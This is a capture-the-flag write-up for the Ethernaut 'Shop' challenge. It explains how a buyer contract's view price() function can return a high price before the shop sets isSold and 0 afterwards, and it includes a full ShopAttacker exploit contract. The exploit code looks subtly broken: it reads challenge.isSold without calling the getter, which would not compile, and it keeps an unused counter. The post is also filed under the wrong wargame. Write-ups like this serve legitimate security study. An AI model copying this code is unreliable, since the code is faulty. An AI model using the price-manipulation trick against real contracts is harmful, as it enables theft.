---
layout: post
title:  Ethernaut - Shop
categories: [pwnable.kr]
excerpt: Writeup for Shop.
---
# Ethernaut - Shop

This uses `cmichel`'s Ethernaut solutions repo as a template, hence the similarities.

# Initial insights

The flow of the program is, importantly:
* Call `_buyer.price()`
* `isSold = true`
* set `price = _buyer.price()`

# Defining the Attack Surface

We have the constraint that `price()` must have `view` visibility, so we can't change the state of whatever the `Buyer` is.

But, we can, however, look at the state of other things no problem!
Importantly, `isSold` is initialized to `0` which is `false`, we flip `isSold` after calling `price()` initially, and then we call `price()` again.
So, we can abuse this and make the value of `price()` depend on `isSold`!

# The exploit

```solidity
pragma solidity ^0.7.3;

abstract contract IShop {
    uint public price;
    bool public isSold;
    function buy() external virtual;
}

contract ShopAttacker {
    IShop public challenge;
    uint256 timesCalled = 1;

    constructor(address challengeAddress) {
        challenge = IShop(challengeAddress);
    }

    function attack() public {
        challenge.buy();
    }

    function price() external view returns (uint256) {
        return challenge.isSold ? 0 : 100;
    }
}
```
